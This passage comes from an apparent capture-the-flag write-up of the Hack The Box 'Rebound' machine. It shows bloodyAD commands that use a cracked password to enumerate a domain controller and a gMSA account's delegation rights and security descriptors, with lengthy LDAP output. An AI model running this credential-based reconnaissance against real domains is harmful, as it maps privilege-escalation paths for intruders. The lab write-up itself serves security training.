MIIGMDCCBRigAwIBAgITbwAAAAK3nQGqoFYApwAAAAAAAjANBgkqhkiG9w0BAQsFADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHcmVib3VuZDEYMBYGA1UEAxMPcmVib3VuZC1EQzAxLUNBMB4XDTIzMDQwODEzNTg1NVoXDTI0MDQwNzEzNTg1NVowGzEZMBcGA1UEAxMQZGMwMS5yZWJvdW5kLmh0YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAL7bthOx87cfEejkd2MoKaNEHURYtn/lroeNbxe8ED6pG4OFs3VfzS+tMDLX8t+J/pDap2s6s1KJckYP3aR8uCiMZzbHpDnNJkPTQ4r1MxuftI8krPzk5Kcv13U9EI5uXSOJcY9ay8rzwNTkzFNHsXMi+RqmzykORAdH+C/2dFEakxYW30uLUgYaxH2jPPi+WCbTZLTIRrb7lBL5iHUgZYi4/w7Y1u1qXH9xB8H8Q60CcvZgCMUaSSKPhzJQ/iNabvN7v0Q7udjW2DpbmixuaO3+x8TymDifi6XN1l5FBeaYNo58gbTZboSZvO6wfiPLltSH0VxIt19Lr4HrKoXrjWkCAwEAAaOCAz4wggM6MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFFwj9KUH+cYykRdfVIZOf57VPacjMB8GA1UdIwQYMBaAFJuYW0Dn6Cuc7TMWlSQCyWiq2+1NMIHKBgNVHR8EgcIwgb8wgbyggbmggbaGgbNsZGFwOi8vL0NOPXJlYm91bmQtREMwMS1DQSxDTj1kYzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXJlYm91bmQsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBwQYIKwYBBQUHAQEEgbQwgbEwga4GCCsGAQUFBzAChoGhbGRhcDovLy9DTj1yZWJvdW5kLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9cmVib3VuZCxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQb+jf2256xkKvfQQ3M5Kj0oIQZGMwMS5yZWJvdW5kLmh0YjBPBgkrBgEEAYI3GQIEQjBAoD4GCisGAQQBgjcZAgGgMAQuUy0xLTUtMjEtNDA3ODM4MjIzNy0xNDkyMTgyODE3LTI1NjgxMjcyMDktMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAknrxTgUhaBS3wkM+idR7U2ABJ+HfEd9jLcxPNsZkWMXTGVR5m2fKNH+6oN/B+sSWcsr+T/bEHCNAvAbOaKKRco6jEeP5D5XYT20q7QTmRdXrr1+iAZ4Pr0beSvSZSOiranoKrsmopqlHaiTqO8NPrmio/LRi9xz1cmMavVDOMphWt+i3YGnaw9UnmRHvAcxyCefl7mNftkLDe2p/Js/kf/xbJpbKui7CL/jXYGkXrxc9KpmIwcQZgqK398ya1l3EoAGpuwN+cRX3FeiyPr1nnsNsJKsTvNK5fH50ay+bAfYKUF+7Y4JM8/H9odhRp4v7pmmAb360ArKgRJPEmP1A0A==
+whenChanged: 2023-09-04 17:21:42+00:00
+whenCreated: 2023-04-07 14:01:58+00:00</code></pre><p id="a54f7bbf-7daa-4bb6-af77-586d33d5c21d" class="">
+</p><p id="834afb76-0f61-43b3-bbd7-990a9bbf0d9f" class="">We know there is another computer so we try that one:</p><p id="6a0e2c2f-5d95-4493-8188-bbd04980e47d" class=""><code> bloodyAD -u ldap_monitor -d rebound.htb -p &#x27;1GR8t@$$4u&#x27; --host 10.129.127.20 get object &#x27;delegator$&#x27; --resolve-sd<br/><br/></code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4dbe6335-3131-4af7-922f-0abfaa87029a" class="code"><code class="language-PowerShell">┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Rebound]
+└─$ bloodyAD -u ldap_monitor -d rebound.htb -p &#x27;1GR8t@$$4u&#x27; --host 10.129.127.20 get object &#x27;delegator$&#x27; --resolve-sd
+
+distinguishedName: CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb
+accountExpires: 9999-12-31 23:59:59.999999+00:00
+badPasswordTime: 2023-04-08 16:22:25.741241+00:00
+cn: delegator
+dNSHostName: gmsa.rebound.htb
+dSCorePropagationData: 1601-01-01 00:00:00+00:00
+instanceType: 4
+lastLogoff: 1601-01-01 00:00:00+00:00
+lastLogon: 2023-04-09 10:25:20.701624+00:00
+lastLogonTimestamp: 2023-04-08 18:12:56.324156+00:00
+logonCount: 14
+msDS-AllowedToDelegateTo: http/dc01.rebound.htb
+msDS-GroupMSAMembership: AQAEgEAAAAAAAAAAAAAAABQAAAAEACwAAQAAAAAAJAD/AQ8AAQUAAAAAAAUVAAAAnSwX8yHn8FjpghKZBh4AAAECAAAAAAAFIAAAACACAAA=
+msDS-ManagedPasswordId: AQAAAEtEU0sCAAAAaQEAAA8AAAAGAAAAqozXLXGPzBuv4FrBregFhwAAAAAYAAAAGAAAAHIAZQBiAG8AdQBuAGQALgBoAHQAYgAAAHIAZQBiAG8AdQBuAGQALgBoAHQAYgAAAA==
+msDS-ManagedPasswordInterval: 30
+msDS-SupportedEncryptionTypes: 28
+nTSecurityDescriptor.Owner: Domain Admins
+nTSecurityDescriptor.Control: DACL_AUTO_INHERITED|DACL_PRESENT|SACL_AUTO_INHERITED|SELF_RELATIVE
+nTSecurityDescriptor.ACL.0.Type: == DENIED_OBJECT ==
+nTSecurityDescriptor.ACL.0.Trustee: EVERYONE
+nTSecurityDescriptor.ACL.0.Right: CONTROL_ACCESS
+nTSecurityDescriptor.ACL.0.ObjectType: User-Force-Change-Password
+nTSecurityDescriptor.ACL.1.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.1.Trustee: Domain Admins
+nTSecurityDescriptor.ACL.1.Right: WRITE_PROP
+nTSecurityDescriptor.ACL.1.ObjectType: SAM-Account-Name; Display-Name; Description; Logon-Information
+nTSecurityDescriptor.ACL.1.InheritedObjectType: Computer
+nTSecurityDescriptor.ACL.2.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.2.Trustee: PRINCIPAL_SELF; Domain Admins
+nTSecurityDescriptor.ACL.2.Right: WRITE_VALIDATED
+nTSecurityDescriptor.ACL.2.ObjectType: Service-Principal-Name; DNS-Host-Name
+nTSecurityDescriptor.ACL.3.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.3.Trustee: Domain Admins
+nTSecurityDescriptor.ACL.3.Right: WRITE_PROP
+nTSecurityDescriptor.ACL.3.ObjectType: Account-Restrictions
+nTSecurityDescriptor.ACL.4.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.4.Trustee: Cert Publishers
+nTSecurityDescriptor.ACL.4.Right: WRITE_PROP|READ_PROP
+nTSecurityDescriptor.ACL.4.ObjectType: X509-Cert
+nTSecurityDescriptor.ACL.5.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.5.Trustee: WINDOWS_AUTHORIZATION_ACCESS_GROUP
+nTSecurityDescriptor.ACL.5.Right: READ_PROP
+nTSecurityDescriptor.ACL.5.ObjectType: Token-Groups-Global-And-Universal
+nTSecurityDescriptor.ACL.6.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.6.Trustee: EVERYONE
+nTSecurityDescriptor.ACL.6.Right: READ_PROP
+nTSecurityDescriptor.ACL.6.ObjectType: ms-DS-ManagedPassword
+nTSecurityDescriptor.ACL.7.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.7.Trustee: PRINCIPAL_SELF
+nTSecurityDescriptor.ACL.7.Right: WRITE_PROP|READ_PROP
+nTSecurityDescriptor.ACL.7.ObjectType: Personal-Information
+nTSecurityDescriptor.ACL.8.Type: == ALLOWED ==
+nTSecurityDescriptor.ACL.8.Trustee: Domain Admins
+nTSecurityDescriptor.ACL.8.Right: GENERIC_READ|DELETE|CONTROL_ACCESS|DELETE_TREE
+nTSecurityDescriptor.ACL.8.ObjectType: Self
+nTSecurityDescriptor.ACL.9.Type: == ALLOWED ==
+nTSecurityDescriptor.ACL.9.Trustee: LOCAL_SYSTEM; ACCOUNT_OPERATORS; Domain Admins
+nTSecurityDescriptor.ACL.9.Right: GENERIC_ALL
+nTSecurityDescriptor.ACL.9.ObjectType: Self
+nTSecurityDescriptor.ACL.10.Type: == ALLOWED ==
+nTSecurityDescriptor.ACL.10.Trustee: AUTHENTICATED_USERS
+nTSecurityDescriptor.ACL.10.Right: GENERIC_READ
+nTSecurityDescriptor.ACL.10.ObjectType: Self
+nTSecurityDescriptor.ACL.11.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.11.Trustee: ALIAS_PREW2KCOMPACC
+nTSecurityDescriptor.ACL.11.Right: READ_PROP
+nTSecurityDescriptor.ACL.11.ObjectType: Account-Restrictions; General-Information; Remote-Access-Information; Group-Membership; Logon-Information
+nTSecurityDescriptor.ACL.11.InheritedObjectType: inetOrgPerson; User
+nTSecurityDescriptor.ACL.11.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
+nTSecurityDescriptor.ACL.12.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.12.Trustee: Key Admins; Enterprise Key Admins
+nTSecurityDescriptor.ACL.12.Right: WRITE_PROP|READ_PROP
+nTSecurityDescriptor.ACL.12.ObjectType: ms-DS-Key-Credential-Link
+nTSecurityDescriptor.ACL.12.Flags: CONTAINER_INHERIT; INHERITED
+nTSecurityDescriptor.ACL.13.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.13.Trustee: PRINCIPAL_SELF; CREATOR_OWNER
+nTSecurityDescriptor.ACL.13.Right: WRITE_VALIDATED
+nTSecurityDescriptor.ACL.13.ObjectType: DS-Validated-Write-Computer
+nTSecurityDescriptor.ACL.13.InheritedObjectType: Computer
+nTSecurityDescriptor.ACL.13.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
+nTSecurityDescriptor.ACL.14.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.14.Trustee: ENTERPRISE_DOMAIN_CONTROLLERS
+nTSecurityDescriptor.ACL.14.Right: READ_PROP
+nTSecurityDescriptor.ACL.14.ObjectType: Token-Groups
+nTSecurityDescriptor.ACL.14.InheritedObjectType: Group; Computer; User
+nTSecurityDescriptor.ACL.14.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
+nTSecurityDescriptor.ACL.15.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.15.Trustee: PRINCIPAL_SELF
+nTSecurityDescriptor.ACL.15.Right: WRITE_PROP
+nTSecurityDescriptor.ACL.15.ObjectType: ms-TPM-Tpm-Information-For-Computer
+nTSecurityDescriptor.ACL.15.InheritedObjectType: Computer
+nTSecurityDescriptor.ACL.15.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
+nTSecurityDescriptor.ACL.16.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.16.Trustee: ALIAS_PREW2KCOMPACC
+nTSecurityDescriptor.ACL.16.Right: GENERIC_READ
+nTSecurityDescriptor.ACL.16.ObjectType: Self
+nTSecurityDescriptor.ACL.16.InheritedObjectType: inetOrgPerson; Group; User
+nTSecurityDescriptor.ACL.16.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
+nTSecurityDescriptor.ACL.17.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.17.Trustee: PRINCIPAL_SELF
+nTSecurityDescriptor.ACL.17.Right: WRITE_PROP|READ_PROP
+nTSecurityDescriptor.ACL.17.ObjectType: ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity
+nTSecurityDescriptor.ACL.17.Flags: CONTAINER_INHERIT; INHERITED; OBJECT_INHERIT
+nTSecurityDescriptor.ACL.18.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.18.Trustee: PRINCIPAL_SELF
+nTSecurityDescriptor.ACL.18.Right: CONTROL_ACCESS|WRITE_PROP|READ_PROP
+nTSecurityDescriptor.ACL.18.ObjectType: Private-Information
+nTSecurityDescriptor.ACL.18.Flags: CONTAINER_INHERIT; INHERITED
+nTSecurityDescriptor.ACL.19.Type: == ALLOWED ==
+nTSecurityDescriptor.ACL.19.Trustee: Enterprise Admins
+nTSecurityDescriptor.ACL.19.Right: GENERIC_ALL
+nTSecurityDescriptor.ACL.19.ObjectType: Self
+nTSecurityDescriptor.ACL.19.Flags: CONTAINER_INHERIT; INHERITED
+nTSecurityDescriptor.ACL.20.Type: == ALLOWED ==
+nTSecurityDescriptor.ACL.20.Trustee: ALIAS_PREW2KCOMPACC
+nTSecurityDescriptor.ACL.20.Right: LIST_CHILD
+nTSecurityDescriptor.ACL.20.ObjectType: Self
+nTSecurityDescriptor.ACL.20.Flags: CONTAINER_INHERIT; INHERITED
+nTSecurityDescriptor.ACL.21.Type: == ALLOWED ==
+nTSecurityDescriptor.ACL.21.Trustee: BUILTIN_ADMINISTRATORS
+nTSecurityDescriptor.ACL.21.Right: WRITE_OWNER|WRITE_DACL|GENERIC_READ|DELETE|CONTROL_ACCESS|WRITE_PROP|WRITE_VALIDATED|CREATE_CHILD
+nTSecurityDescriptor.ACL.21.ObjectType: Self
+nTSecurityDescriptor.ACL.21.Flags: CONTAINER_INHERIT; INHERITED
+name: delegator
+objectCategory: CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=rebound,DC=htb
+objectClass: top; person; organizationalPerson; user; computer; msDS-GroupManagedServiceAccount
+objectGUID: {c9da97ae-5e35-44d2-aa15-114aecdc0caf}
+objectSid: S-1-5-21-4078382237-1492182817-2568127209-7687
+primaryGroupID: 515
+pwdLastSet: 2023-04-08 09:08:31.953297+00:00
+sAMAccountName: delegator$
+sAMAccountType: 805306369
+servicePrincipalName: browser/dc01.rebound.htb
+uSNChanged: 102800
+uSNCreated: 69353
+userAccountControl: WORKSTATION_TRUST_ACCOUNT
+whenChanged: 2023-04-09 10:24:00+00:00
+whenCreated: 2023-04-08 09:08:31+00:00
+                                                                                                                                                                                                           
+┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Rebound]
+└─$ bloodyAD -u oorend -d rebound.htb -p &#x27;1GR8t@$$4u&#x27; --host 10.129.127.20 get object &#x27;delegator$&#x27; --resolve-sd
+
+distinguishedName: CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb
+accountExpires: 9999-12-31 23:59:59.999999+00:00
+badPasswordTime: 2023-04-08 16:22:25.741241+00:00
+cn: delegator
+dNSHostName: gmsa.rebound.htb
+dSCorePropagationData: 1601-01-01 00:00:00+00:00
+instanceType: 4
+lastLogoff: 1601-01-01 00:00:00+00:00
+lastLogon: 2023-04-09 10:25:20.701624+00:00
+lastLogonTimestamp: 2023-04-08 18:12:56.324156+00:00
+logonCount: 14
+msDS-AllowedToDelegateTo: http/dc01.rebound.htb
+msDS-GroupMSAMembership: AQAEgEAAAAAAAAAAAAAAABQAAAAEACwAAQAAAAAAJAD/AQ8AAQUAAAAAAAUVAAAAnSwX8yHn8FjpghKZBh4AAAECAAAAAAAFIAAAACACAAA=
+msDS-ManagedPasswordId: AQAAAEtEU0sCAAAAaQEAAA8AAAAGAAAAqozXLXGPzBuv4FrBregFhwAAAAAYAAAAGAAAAHIAZQBiAG8AdQBuAGQALgBoAHQAYgAAAHIAZQBiAG8AdQBuAGQALgBoAHQAYgAAAA==
+msDS-ManagedPasswordInterval: 30
+msDS-SupportedEncryptionTypes: 28
+nTSecurityDescriptor.Owner: Domain Admins
+nTSecurityDescriptor.Control: DACL_AUTO_INHERITED|DACL_PRESENT|SACL_AUTO_INHERITED|SELF_RELATIVE
+nTSecurityDescriptor.ACL.0.Type: == DENIED_OBJECT ==
+nTSecurityDescriptor.ACL.0.Trustee: EVERYONE
+nTSecurityDescriptor.ACL.0.Right: CONTROL_ACCESS
+nTSecurityDescriptor.ACL.0.ObjectType: User-Force-Change-Password
+nTSecurityDescriptor.ACL.1.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.1.Trustee: Domain Admins
+nTSecurityDescriptor.ACL.1.Right: WRITE_PROP
+nTSecurityDescriptor.ACL.1.ObjectType: SAM-Account-Name; Display-Name; Description; Logon-Information
+nTSecurityDescriptor.ACL.1.InheritedObjectType: Computer
+nTSecurityDescriptor.ACL.2.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.2.Trustee: PRINCIPAL_SELF; Domain Admins
+nTSecurityDescriptor.ACL.2.Right: WRITE_VALIDATED
+nTSecurityDescriptor.ACL.2.ObjectType: DNS-Host-Name; Service-Principal-Name
+nTSecurityDescriptor.ACL.3.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.3.Trustee: Domain Admins
+nTSecurityDescriptor.ACL.3.Right: WRITE_PROP
+nTSecurityDescriptor.ACL.3.ObjectType: Account-Restrictions
+nTSecurityDescriptor.ACL.4.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.4.Trustee: Cert Publishers
+nTSecurityDescriptor.ACL.4.Right: WRITE_PROP|READ_PROP
+nTSecurityDescriptor.ACL.4.ObjectType: X509-Cert
+nTSecurityDescriptor.ACL.5.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.5.Trustee: WINDOWS_AUTHORIZATION_ACCESS_GROUP
+nTSecurityDescriptor.ACL.5.Right: READ_PROP
+nTSecurityDescriptor.ACL.5.ObjectType: Token-Groups-Global-And-Universal
+nTSecurityDescriptor.ACL.6.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.6.Trustee: EVERYONE
+nTSecurityDescriptor.ACL.6.Right: READ_PROP
+nTSecurityDescriptor.ACL.6.ObjectType: ms-DS-ManagedPassword
+nTSecurityDescriptor.ACL.7.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.7.Trustee: PRINCIPAL_SELF
+nTSecurityDescriptor.ACL.7.Right: WRITE_PROP|READ_PROP
+nTSecurityDescriptor.ACL.7.ObjectType: Personal-Information
+nTSecurityDescriptor.ACL.8.Type: == ALLOWED ==
+nTSecurityDescriptor.ACL.8.Trustee: Domain Admins
+nTSecurityDescriptor.ACL.8.Right: GENERIC_READ|DELETE|CONTROL_ACCESS|DELETE_TREE
+nTSecurityDescriptor.ACL.8.ObjectType: Self
+nTSecurityDescriptor.ACL.9.Type: == ALLOWED ==
+nTSecurityDescriptor.ACL.9.Trustee: ACCOUNT_OPERATORS; Domain Admins; LOCAL_SYSTEM
+nTSecurityDescriptor.ACL.9.Right: GENERIC_ALL
+nTSecurityDescriptor.ACL.9.ObjectType: Self
+nTSecurityDescriptor.ACL.10.Type: == ALLOWED ==
+nTSecurityDescriptor.ACL.10.Trustee: AUTHENTICATED_USERS
+nTSecurityDescriptor.ACL.10.Right: GENERIC_READ
+nTSecurityDescriptor.ACL.10.ObjectType: Self
+nTSecurityDescriptor.ACL.11.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.11.Trustee: ALIAS_PREW2KCOMPACC
+nTSecurityDescriptor.ACL.11.Right: READ_PROP
+nTSecurityDescriptor.ACL.11.ObjectType: Group-Membership; Account-Restrictions; Logon-Information; Remote-Access-Information; General-Information
+nTSecurityDescriptor.ACL.11.InheritedObjectType: User; inetOrgPerson
+nTSecurityDescriptor.ACL.11.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
+nTSecurityDescriptor.ACL.12.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.12.Trustee: Key Admins; Enterprise Key Admins
+nTSecurityDescriptor.ACL.12.Right: WRITE_PROP|READ_PROP
+nTSecurityDescriptor.ACL.12.ObjectType: ms-DS-Key-Credential-Link
+nTSecurityDescriptor.ACL.12.Flags: CONTAINER_INHERIT; INHERITED
+nTSecurityDescriptor.ACL.13.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.13.Trustee: CREATOR_OWNER; PRINCIPAL_SELF
+nTSecurityDescriptor.ACL.13.Right: WRITE_VALIDATED
+nTSecurityDescriptor.ACL.13.ObjectType: DS-Validated-Write-Computer
+nTSecurityDescriptor.ACL.13.InheritedObjectType: Computer
+nTSecurityDescriptor.ACL.13.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
+nTSecurityDescriptor.ACL.14.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.14.Trustee: ENTERPRISE_DOMAIN_CONTROLLERS
+nTSecurityDescriptor.ACL.14.Right: READ_PROP
+nTSecurityDescriptor.ACL.14.ObjectType: Token-Groups
+nTSecurityDescriptor.ACL.14.InheritedObjectType: Computer; Group; User
+nTSecurityDescriptor.ACL.14.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
+nTSecurityDescriptor.ACL.15.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.15.Trustee: PRINCIPAL_SELF
+nTSecurityDescriptor.ACL.15.Right: WRITE_PROP
+nTSecurityDescriptor.ACL.15.ObjectType: ms-TPM-Tpm-Information-For-Computer
+nTSecurityDescriptor.ACL.15.InheritedObjectType: Computer
+nTSecurityDescriptor.ACL.15.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
+nTSecurityDescriptor.ACL.16.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.16.Trustee: ALIAS_PREW2KCOMPACC
+nTSecurityDescriptor.ACL.16.Right: GENERIC_READ
+nTSecurityDescriptor.ACL.16.ObjectType: Self
+nTSecurityDescriptor.ACL.16.InheritedObjectType: Group; inetOrgPerson; User
+nTSecurityDescriptor.ACL.16.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
+nTSecurityDescriptor.ACL.17.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.17.Trustee: PRINCIPAL_SELF
+nTSecurityDescriptor.ACL.17.Right: WRITE_PROP|READ_PROP
+nTSecurityDescriptor.ACL.17.ObjectType: ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity
+nTSecurityDescriptor.ACL.17.Flags: CONTAINER_INHERIT; INHERITED; OBJECT_INHERIT
+nTSecurityDescriptor.ACL.18.Type: == ALLOWED_OBJECT ==
+nTSecurityDescriptor.ACL.18.Trustee: PRINCIPAL_SELF
+nTSecurityDescriptor.ACL.18.Right: CONTROL_ACCESS|WRITE_PROP|READ_PROP
+nTSecurityDescriptor.ACL.18.ObjectType: Private-Information
+nTSecurityDescriptor.ACL.18.Flags: CONTAINER_INHERIT; INHERITED
+nTSecurityDescriptor.ACL.19.Type: == ALLOWED ==
+nTSecurityDescriptor.ACL.19.Trustee: Enterprise Admins
+nTSecurityDescriptor.ACL.19.Right: GENERIC_ALL
+nTSecurityDescriptor.ACL.19.ObjectType: Self
+nTSecurityDescriptor.ACL.19.Flags: CONTAINER_INHERIT; INHERITED
+nTSecurityDescriptor.ACL.20.Type: == ALLOWED ==
+nTSecurityDescriptor.ACL.20.Trustee: ALIAS_PREW2KCOMPACC
+nTSecurityDescriptor.ACL.20.Right: LIST_CHILD
+nTSecurityDescriptor.ACL.20.ObjectType: Self
+nTSecurityDescriptor.ACL.20.Flags: CONTAINER_INHERIT; INHERITED
+nTSecurityDescriptor.ACL.21.Type: == ALLOWED ==
+nTSecurityDescriptor.ACL.21.Trustee: BUILTIN_ADMINISTRATORS
+nTSecurityDescriptor.ACL.21.Right: WRITE_OWNER|WRITE_DACL|GENERIC_READ|DELETE|CONTROL_ACCESS|WRITE_PROP|WRITE_VALIDATED|CREATE_CHILD
+nTSecurityDescriptor.ACL.21.ObjectType: Self
+nTSecurityDescriptor.ACL.21.Flags: CONTAINER_INHERIT; INHERITED
+name: delegator
+objectCategory: CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=rebound,DC=htb
+objectClass: top; person; organizationalPerson; user; computer; msDS-GroupManagedServiceAccount
+objectGUID: {c9da97ae-5e35-44d2-aa15-114aecdc0caf}
+objectSid: S-1-5-21-4078382237-1492182817-2568127209-7687
+primaryGroupID: 515
+pwdLastSet: 2023-04-08 09:08:31.953297+00:00
+sAMAccountName: delegator$
+sAMAccountType: 805306369
+servicePrincipalName: browser/dc01.rebound.htb
+uSNChanged: 102800
+uSNCreated: 69353
+userAccountControl: WORKSTATION_TRUST_ACCOUNT
+whenChanged: 2023-04-09 10:24:00+00:00
+whenCreated: 2023-04-08 09:08:31+00:00</code></pre><p id="dd9d00b1-cd31-4ead-816c-0c7eeeec899f" class="">
+</p><p id="86bf4c88-59af-4080-bc78-6e97dd494e13" class="">
+</p><p id="6a4a0f9d-aa79-4986-81d1-18fb6c99cde2" class="">Some more enumearation</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="579fefb0-0825-41f3-884c-1621f59fb976" class="code"><code class="language-PowerShell">┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Rebound]
+└─$ bloodyAD -u oorend -d rebound.htb -p &#x27;1GR8t@$$4u&#x27; --host 10.129.127.20 get object &#x27;DC01$&#x27; --attr servicePrincipalName
+
+distinguishedName: CN=DC01,OU=Domain Controllers,DC=rebound,DC=htb
+servicePrincipalName: ldap/dc01.rebound.htb/ForestDnsZones.rebound.htb; ldap/dc01.rebound.htb/DomainDnsZones.rebound.htb; Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc01.rebound.htb; DNS/dc01.rebound.htb; GC/dc01.rebound.htb/rebound.htb; HOST/dc01.rebound.htb/rebound; HOST/dc01.rebound.htb/rebound.htb; ldap/dc01.rebound.htb/rebound; ldap/dc01.rebound.htb; ldap/dc01.rebound.htb/rebound.htb; RestrictedKrbHost/dc01.rebound.htb; HOST/dc01.rebound.htb; RestrictedKrbHost/DC01; HOST/DC01/rebound; HOST/DC01; ldap/DC01/rebound; ldap/DC01; RPC/1b88a206-6597-46cd-b042-25101349355f._msdcs.rebound.htb; E3514235-4B06-11D1-AB04-00C04FC2DCD2/1b88a206-6597-46cd-b042-25101349355f/rebound.htb; ldap/1b88a206-6597-46cd-b042-25101349355f._msdcs.rebound.htb
+                                                                                                                                                                                                           
+┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Rebound]
+└─$ bloodyAD -u oorend -d rebound.htb -p &#x27;1GR8t@$$4u&#x27; --host 10.129.127.20 get object &#x27;delegator$&#x27; --attr servicePrincipalName
+
+distinguishedName: CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb
+servicePrincipalName: browser/dc01.rebound.htb</code></pre><p id="107868b3-780f-497b-bf20-7d99ff760cea" class="">
